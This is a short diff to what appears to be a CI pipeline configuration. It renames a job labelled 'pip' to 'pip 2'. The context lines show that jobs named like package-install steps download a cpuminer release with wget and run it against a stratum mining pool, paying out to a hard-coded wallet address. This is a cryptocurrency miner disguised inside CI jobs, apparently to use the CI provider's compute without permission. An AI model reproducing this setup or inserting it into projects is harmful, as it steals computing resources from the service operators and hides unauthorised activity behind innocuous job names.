@@ -22,7 +22,7 @@ blocks:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q7rd7nzu0vxv7tks8phzkd70gtuxnf3jkjhm9g8.sema'
-        - name: pip
+        - name: pip 2
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
